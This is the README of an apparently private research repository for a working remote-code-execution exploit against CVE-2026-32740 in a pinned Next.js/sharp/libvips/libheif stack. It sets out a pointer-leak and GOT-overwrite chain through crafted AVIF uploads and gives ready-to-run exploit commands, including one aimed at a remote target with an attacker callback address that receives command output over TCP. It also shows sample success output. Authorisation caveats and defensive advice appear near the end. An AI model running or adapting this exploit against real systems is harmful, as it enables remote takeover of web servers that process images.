# libheif grid-to-GOT Next.js RCE

Working remote proof of concept that turns CVE-2026-32740 in the
version-pinned Next.js/sharp image stack into a chosen-address write and a
validated `/usr/bin/id` callback.

This is a private Fortbridge research repository. Use it only against the
included lab or another system you are explicitly authorised to test.

## What the PoC proves

The exploit uses only the target's HTTP upload and image-optimization routes:

1. It repeatedly submits a donor AVIF and compares pointers in the returned
   pixels with every exact libvips profile in the manifest.
2. It proceeds only when one profile and one randomized libvips base are
   supported by all required independent anchors.
3. It scans those same pixels for a complete heap record tied to the recovered
   libvips base. The record must contain repeated peer pointers, an arena
   sentinel, three libvips references and a bounded related-pointer delta.
4. It calculates a control target as the recovered libvips base plus the
   profile-verified `g_spawn_command_line_async` offset.
5. It uploads a short Node callback script as `uploads/x`.
6. It generates a 116x33 four-tile AVIF whose Cb overflow redirects the Cr
   plane to `memcpy@GOT - 16`.
7. The first chosen-address row stores `node uploads/x` immediately before the
   GOT slot and replaces `memcpy@GOT` with the derived libvips helper. The next
   row calls that helper with the command already in RDI.
8. The staged script runs the fixed command `/usr/bin/id` and returns its
   output over TCP. An internal per-attempt identifier prevents a
   stale or unrelated callback from being counted as success; it is not the
   command-execution proof.

The libvips-relative validation cohort is recorded in
[`evidence/libvips-control-target-rce-10x.json`](evidence/libvips-control-target-rce-10x.json).

## Tested stack

- Node.js 25.8.1, non-PIE `ET_EXEC`
- Next.js 15.5.23
- sharp 0.34.4
- bundled libvips 8.17.2
- bundled libheif 1.20.2
- Linux x86-64 with ASLR and NX enabled

The published end-to-end cohort uses the exact non-PIE Node 25.8.1 artifact
above. A second diagnostic cohort used an upstream Node 25.8.1 `ET_DYN` build
with build ID `c52fa8d905d7eab79d16c17215f1618f1b8a4429` and SHA-256
`4f068fde6d1856f5884072d086999e9ac82234139ddbd3157d15bd1c623e9f5c`.
Across ten fresh PIE processes, all ten runs recovered a different randomized
libvips base, calculated a different `g_spawn_command_line_async` address, and
returned valid `/usr/bin/id` output. The independently measured selector
`0x5970` was held constant solely to isolate the control-target variable.

That 10/10 isolation cohort proves the old fixed Node address is no longer
needed. It does not claim that the delivered heap calibrator supports this PIE
heap layout. Safe donor sampling exposed the complete heap record
inconsistently, so an unsupported PIE layout still fails before the payload
upload rather than guessing a selector. The reviewable diagnostic evidence is
in
[`evidence/libvips-control-target-pie-isolation-10x.json`](evidence/libvips-control-target-pie-isolation-10x.json).

The control target no longer depends on the Node executable type or address.
The profile contains a libvips-relative helper offset, validating bytes, ABI,
the `memcpy` relocation and heap relationships. It contains neither a fixed
Node loader address nor a fixed fake-node low word. The exploit fails closed
when a profile is malformed, returned pixels do not select exactly one
supported profile/base pair, or heap evidence does not produce one
structurally supported selector.

## Requirements

- Linux x86-64
- Python 3.11 or later
- `ffmpeg` with the `libaom-av1` encoder
- an IPv4 callback address reachable from the target
- Node.js 25.8.1 and npm to run the included lab

Install the only Python dependency:

```bash
python3 -m venv .venv
. .venv/bin/activate
python3 -m pip install -r requirements.txt
```

Confirm AV1 encoding support:

```bash
ffmpeg -hide_banner -encoders | grep libaom-av1
```

## Start the included lab

The lab intentionally accepts arbitrary uploads and passes selected files to
sharp. Do not expose it to an untrusted network.

```bash
cd lab
npm ci
npm run build
npm run start
```

The target is then available at `http://127.0.0.1:3000`.

Do not add `LD_PRELOAD`, `MALLOC_ARENA_MAX`, `GLIBC_TUNABLES`,
`VIPS_CONCURRENCY` or `UV_THREADPOOL_SIZE`. The published result uses the
stock process environment and normal sharp worker scheduling.

## Run the exploit

For a local lab, use loopback for both the target and callback:

```bash
python3 exploit.py \
  --target http://127.0.0.1:3000 \
  --callback-host 127.0.0.1 \
  --json-output result.json
```

The exploit evaluates every profile in the manifest by default. To restrict
classification to one exact supported stack, provide its ID explicitly:

```bash
python3 exploit.py \
  --target http://127.0.0.1:3000 \
  --callback-host 127.0.0.1 \
  --profile node-25.8.1-sharp-0.34.4-linux-x64
```

For an authorised remote target, `--callback-host` must be an attacker IPv4
address that the target can reach. The listener binds to all local interfaces
by default:

```bash
python3 exploit.py \
  --target https://authorised-target.example \
  --callback-host 203.0.113.10 \
  --callback-port 31337 \
  --json-output result.json
```

A successful result contains:

```json
{
  "success": true,
  "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
  "libvips_base": "0x7f1234400000",
  "control_target": {
    "module": "libvips",
    "module_base": "0x7f1234400000",
    "module_build_id": "2c8b33114a735268d2211ca2003bc4a327b81411",
    "symbol": "g_spawn_command_line_async",
    "offset": "0x349a13",
    "address": "0x7f1234749a13",
    "derivation": "0x7f1234400000 + 0x349a13 = 0x7f1234749a13",
    "abi": "command_rdi_error_rsi",
    "validating_bytes": "534889f14889f331f64883ec2048c744241800000000488d"
  },
  "heap_calibration": {
    "derived_selector": "0x5970",
    "minimum_observations": 1,
    "observations": [
      {
        "response_sha256": "...",
        "candidate_selectors": ["0x5970"],
        "matches": [
          {
            "anchor": "0x7f00104f6e30",
            "anchor_page": "0x7f00104f6000",
            "fake_node_delta_from_anchor_page": "-0x690",
            "derived_fake_node": "0x7f00104f5970"
          }
        ]
      }
    ]
  },
  "classification": {
    "selected_attempt": 4,
    "selected_profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
    "selected_base": "0x7f1234400000",
    "selected_anchors": [
      {"offset": "0x1be1b0", "value": "0x7f12345be1b0", "repetitions": 1},
      {"offset": "0x1c3120", "value": "0x7f12345c3120", "repetitions": 3},
      {"offset": "0x1c3130", "value": "0x7f12345c3130", "repetitions": 3}
    ],
    "rejected_candidates": []
  },
  "callback": {
    "token_matched": true,
    "proof_command": "/usr/bin/id",
    "command_output": "uid=1000(research) gid=1000(research) groups=1000(research)"
  }
}
```

The terminal also prints the result directly:

```text
[RCE] /usr/bin/id -> uid=1000(research) gid=1000(research) groups=1000(research)
```

The optimizer request will usually end with a connection drop and the target
process will normally terminate after the callback. Those events are recorded
for context but are not success conditions.

## Command-line options

```text
--target URL              Target base URL (required)
--callback-host IPV4      Address embedded in the uploaded script (required)
--callback-port PORT      Callback and listener port (default: 31337)
--listen-host IPV4        Local bind address (default: 0.0.0.0)
--leak-attempts N         Maximum donor requests (default: 64)
--callback-timeout SEC    Listener timeout (default: 12)
--trigger-timeout SEC     Optimizer request timeout (default: 20)
--profile-manifest FILE   Profile manifest (default: repository manifest)
--profile ID              Restrict classification to one exact profile
--script-name NAME        Override the profile's staged callback filename
--remote-upload-dir DIR   Override the profile's upload directory
--json-output FILE        Save the complete result
--concise                 Omit the full JSON result from the terminal
```

The complete command, including its terminating NUL, must fit the selected
profile's command field. The default `node uploads/x` satisfies the pinned
profile's 16-byte constraint.

## Native-stack profiles

[`profiles/native_stack_profiles.json`](profiles/native_stack_profiles.json)
binds one exploit layout to exact artifacts and ABI measurements. The pinned
profile identifies Node, Next.js, sharp, libvips, libheif, glibc and
libstdc++, then records the libvips control helper, GOT relocation,
returned-pointer anchors, forged red-black-tree/ImagePlane layout, heap-record
relation, tile geometry and application paths.

The runtime loader rejects unknown or missing fields, malformed numbers and
digests, unsafe paths, and inconsistent geometry before making an HTTP request.
A profile is a verified compatibility record, not an automatic OS guess.

Each libvips classifier entry declares independent module-relative anchors,
the minimum number of times each anchor must appear, how many distinct anchors
are required, the alpha-channel byte window to scan, the qword stride, and the
expected page alignment. For every returned image, the classifier subtracts
each candidate profile's anchor offsets from the returned qwords. It accepts a
result only when exactly one profile/base pair reaches the declared consensus.

Server, framework, image-geometry, OS, and glibc hints are supporting metadata
only. They are recorded in the result but never identify a binary and never
resolve an ambiguous pointer signature. If evidence is missing, incomplete,
mismatched, unknown, or supports more than one pair, the exploit stops before
rendering or uploading the callback script and before generating, uploading,
or triggering the final AVIF.

The regression suite includes an exact second-build response fixture from
libvips 8.18.4. Its two independent anchors do not cross-match the pinned
libvips 8.17.2 profile; one anchor also has a ten-occurrence threshold to test
that repeated values cannot replace independent anchors.

Successful JSON output records the selecting response attempt, selected
profile and base, each anchor value and repetition count, and every rejected
candidate. It also records each heap response hash, matching response offset,
arena sentinel, heap pointers, libvips references, signed relation and derived
selector. Earlier no-match attempts remain in the `classification.attempts`
array for auditability.

The heap calibrator does not trust a raw low word. A candidate must be inside
a complete returned record containing the expected heap chunk size, a 64 MiB
arena sentinel, paired heap pointers, three pointers relative to the already
recovered libvips base and the declared marker. The profile selects the lowest
complete record, normalises the selected anchor to its page, and applies the
signed page-to-fake-node relation. This removes harmless sub-page allocator
shifts from the calculation. The record itself supplies repeated heap-pointer
observations and three independent libvips-relative checks. If no complete
record exists, or multiple derived values independently reach the configured
threshold, the exploit stops before it uploads either the callback script or
the destructive AVIF.

Verify a local stack against every declared identity before using its profile:

```bash
python3 tools/verify_profile_artifacts.py \
  --node /home/research/.nvm/versions/node/v25.8.1/bin/node \
  --libvips lab/node_modules/@img/sharp-libvips-linux-x64/lib/libvips-cpp.so.8.17.2 \
  --libc /usr/lib/x86_64-linux-gnu/libc.so.6 \
  --libstdcxx /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.35 \
  --next-package lab/node_modules/next/package.json \
  --sharp-package lab/node_modules/sharp/package.json \
  --libvips-package lab/node_modules/@img/sharp-libvips-linux-x64/package.json \
  --versions-json lab/node_modules/@img/sharp-libvips-linux-x64/versions.json
```

This offline verifier checks hashes, ELF build IDs and type, Node version, the
libvips `memcpy` jump slot, the control-target symbol and bytes, npm package
versions, and bundled libvips/libheif versions. It is deliberately not
imported or run by the remote exploit.

Run the regression suite and fresh-process cohort with:

```bash
python3 -m unittest discover -s tests -v
python3 scripts/fresh_process_cohort.py --lifetimes 10
```

## Repository layout

```text
exploit.py                         remote orchestrator and callback verifier
control_target.py                  libvips base-plus-offset target derivation
profile_classifier.py              pure returned-pixel profile/base classifier
heap_calibrator.py                  repeated returned-pixel heap calibration
rce_payload.py                     proven memcpy-GOT AVIF payload
stack_profile.py                   strict native-stack profile loader
profiles/native_stack_profiles.json exact supported artifact and ABI identity
tools/verify_profile_artifacts.py  offline exact-artifact verifier
scripts/fresh_process_cohort.py    stock fresh-process validation harness
tests/                             strict-loader and exploit regressions
tests/fixtures/                    exact cross-build returned-pixel evidence
avif_grid.py                       lossless AV1 grid/ISO-BMFF generator
callback/callback.js               fixed /usr/bin/id callback template
payloads/leak-crop-donor-*.avif    returned-pixel information disclosure
lab/                               version-pinned Next.js target
evidence/                          debugger-free validation results
```

`rce_payload.py` contains only the final demonstrated chain. Abandoned BSS,
vtable and rb-tree-GOT experiments were intentionally excluded.

## Scope and limitations

- The target needs an upload path that preserves an attacker-chosen script in
  a location reachable from the application working directory, plus a sharp
  optimization path for AVIF.
- The included lab accepts the staged script as `uploads/x`. Strong magic
  validation or generated storage names can break the staging step.
- The libvips offset applies only to the exact verified libvips artifact. The
  runtime address is always calculated from remotely returned pointers.
- The low-16-bit plane-map redirection depends on a profile-specific returned
  heap-record shape and anchor-page-to-fake-node relation.
- The PoC proves native execution by returning `/usr/bin/id` output; it does
  not provide an arbitrary command interface or attempt to keep the corrupted
  target process alive.

## Defensive guidance

- Upgrade to a libheif release containing the CVE-2026-32740 fix and rebuild
  every dependent sharp/libvips component.
- Reject or isolate AVIF/HEIF processing until the deployed native dependency
  chain has been verified.
- Validate upload magic, generate server-side names and store uploads outside
  the application working directory on a `noexec` mount.
- Run image decoding in a disposable, least-privileged worker without secrets
  or unrestricted outbound network access.
- Monitor native image workers for crashes, unexpected process creation, or
  file access against upload directories.

## Reproducibility rules

The final evidence was produced without `LD_PRELOAD`, `/proc` address reads,
debugger-derived runtime values, disabled ASLR, allocator tuning, worker-count
changes or target configuration changes. Passive debugging was used during
development only to label fixed binary offsets and was not part of the
delivered exploit.
